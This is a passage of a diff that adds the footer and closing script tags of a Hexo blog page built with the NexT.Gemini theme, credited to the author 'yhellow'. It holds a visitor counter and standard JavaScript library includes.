+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">22:58</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
